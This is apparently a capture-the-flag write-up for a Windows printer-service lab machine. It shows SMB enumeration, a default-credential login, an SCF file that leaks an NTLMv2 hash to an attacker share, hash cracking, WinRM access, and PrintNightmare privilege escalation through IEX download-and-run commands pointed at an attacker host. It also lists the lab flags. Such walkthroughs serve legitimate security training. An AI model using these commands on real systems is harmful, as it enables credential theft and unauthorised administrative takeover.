
**Skills Required**
Enumeration
Offline password cracking
**Skills Learned**
Hash capturing
Meterpreter exploitation

### Step 1: Initial Reconnaissance

Start by gathering information about the target machine. You can use tools like `nmap` to scan for open ports and services. In this case, we've found three open ports: 5985 (winrm), 445 (smb), and 80 (http).

### Step 2: SMB Enumeration

We will use the tool `crackmapexec` to collect information about the machine through the open SMB port (port 445). Run the following command:

```bash
crackmapexec smb 10.10.11.106
```

You can also list network-level shared resources using:

```bash
crackmapexec smb 10.10.11.106 --shared
```

Alternatively, you can use `smbmap`:

```bash
smbmap -H 10.10.11.106 -n 'null'
```

If no resources can be listed, you will need valid credentials for further access.

### Step 3: Web Vulnerability Assessment

Check the website hosted on port 80 (http) for vulnerabilities and user enumeration using a tool like `whatweb`:

```bash
whatweb 10.10.11.106
```

Upon entering the website, it asks to log in. I try with default credentials "admin:admin" and gain access to the web. It's a printer service.

### Step 4: SCF File Attack

There's an application where I can upload a printer firmware, and it seems there's a testing team that checks the uploaded file. I can attempt an SCF File attack by abusing the icon (In an SCF file attack, the attacker creates a specially crafted SCF file that takes advantage of the way Windows handles these shortcut files. When the victim opens or even previews the SCF file, Windows automatically attempts to load icon resource information from it. This automatic behavior can be exploited by attackers to gather sensitive information like NTLMv2 hashes when the victim accesses the malicious SCF file over an SMB (Server Message Block) share.) Create an `.scf` file with the following content:

```plaintext
[Shell]
Command=2
IconFile=\\10.10.14.4\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Then, mount a shared resource via SMB on your machine with Impacket smbserver:

```bash
impacket-smbserver share $(pwd) -smb2support
```

This will allow you to obtain the NTLMv2 hash.

### Step 5: Hash Cracking

Crack the obtained NTLMv2 hash using a tool like `john` with a wordlist:

```bash
john --wordlist=rockyou.txt hash
```

This step will give you valid credentials.

### Step 6: Verification

Verify the obtained credentials using `crackmapexec` for WinRM access:

```bash
crackmapexec winrm 10.10.11.106 -u 'tony' -p 'liltony'
```

If successful, `crackmapexec` will return "Pwn3d," indicating the user is in the "remote management users" group.

### Step 7: Access and Privilege Escalation

Gain access to the target machine using `evil-winrm`:

```bash
evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
```

Once inside, check your privileges:

```bash
whoami /priv
whoami /all
```

### Step 8: Privilege Escalation Techniques

Use `powerUp.ps1` to search for privilege escalation vectors:

- Download `PowerUp.ps1` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).
- Add `Invoke-AllChecks` to the end of the file.
- Execute the script on the victim's machine.

```bash
# On your machine
python -m http.server 80

# On the victim's machine
PS> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerUp.ps1')
```

If this doesn't yield much, consider using `winpeas`, a more comprehensive privilege escalation tool:

- Download the `winpeas.exe` binary from [PEASS-ng](https://github.com/carlospolop/PEASS-ng/releases/tag/20230903-188479ae).
- Upload it to the victim's machine and run it.

```bash
# On the victim's machine
mkdir C:\Windows\temp\Privesc
cd C:\Windows\temp\privesc
upload winpeas.exe
```

### Step 9: Print Spooler Exploitation

Discover vulnerabilities in the print spooler service. Exploit the "printnightmare" vulnerability using the `CVE-2021-1675.ps1` script:  https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1

```bash
# On your machine
python -m http.server 80

# On the victim's machine
PS> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/nightmare.ps1')
PS> Invoke-Nightmare -DriverName "Xerox" -NewUser "kvzlx" -NewPassword "kvzlx1234@"
```

This creates a user in the Administrator group, granting escalated privileges.

With the successful privilege escalation, you have completed the penetration testing and privilege escalation on the target machine.
user flag 3bb8b07e2fd0e1071f47b871970a5977
root flag 7d0c42c6de00f5debc3d555b629c1b9d

---
